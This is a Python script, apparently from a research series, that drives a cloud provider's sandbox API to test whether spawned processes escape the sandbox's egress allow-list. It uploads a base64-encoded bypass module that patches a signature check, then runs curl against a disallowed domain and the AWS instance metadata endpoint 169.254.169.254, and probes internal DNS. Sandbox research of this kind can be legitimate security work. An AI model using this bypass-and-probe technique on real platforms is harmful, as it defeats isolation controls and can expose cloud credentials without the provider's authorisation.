# 实验J86: 沙箱 networkPolicy 对 spawn 进程是否生效 — egress 绕过 + metadata 探测
import json, time, urllib.request, urllib.error, sys, base64, re
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    out = ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return out

NAME = "expj86"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

TOOL_B64 = base64.b64encode(open("init_sock_bypass.py", "rb").read()).decode()

PROBE = r"""
import importlib.util, base64, os, json, subprocess

# 基线: 沙箱 shell 直接访问 (应被 networkPolicy 拦)
print("== [1] 基线: shell 直接访问 google (策略外) ==", flush=True)
r = subprocess.run(["sh", "-c", "curl -sS -m 6 -o /dev/null -w '%{http_code}' https://www.google.com 2>&1; echo; curl -sS -m 6 -o /dev/null -w '%{http_code}' https://httpbin.org/get 2>&1; echo"],
                   capture_output=True, text=True, timeout=30)
print("  rc=%d out=%r err=%r" % (r.returncode, r.stdout[:200], r.stderr[:200]), flush=True)

# patch + spawn 网络探测
print("== [2] spawn 进程网络探测 ==", flush=True)
TOOL = base64.b64decode(r""" + '"' + TOOL_B64 + '"' + r""")
open("/tmp/ib.py", "wb").write(TOOL)
spec = importlib.util.spec_from_file_location("ib", "/tmp/ib.py")
ib = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ib)
ib.patch_sigcheck()

probe_sh = r'''
echo '--- [a] google.com (策略外) ---'
curl -sS -m 6 -o /dev/null -w 'HTTP=%{http_code} ip=%{remote_ip} time=%{time_total}' https://www.google.com 2>&1; echo
echo '--- [b] AWS metadata (169.254.169.254) ---'
curl -sS -m 4 -w '\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 400; echo
echo '--- [c] httpbin.org (策略内, 对照) ---'
curl -sS -m 6 -o /dev/null -w 'HTTP=%{http_code}' https://httpbin.org/get 2>&1; echo
echo '--- [d] 内网 DNS 探测 ---'
getent hosts host.docker.internal 2>&1 | head -2
cat /etc/resolv.conf
'''
ib.spawn("sh", args=["-c", probe_sh], timeout=90)
"""
run_cmd(sid, PROBE, "spawn-netprobe", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
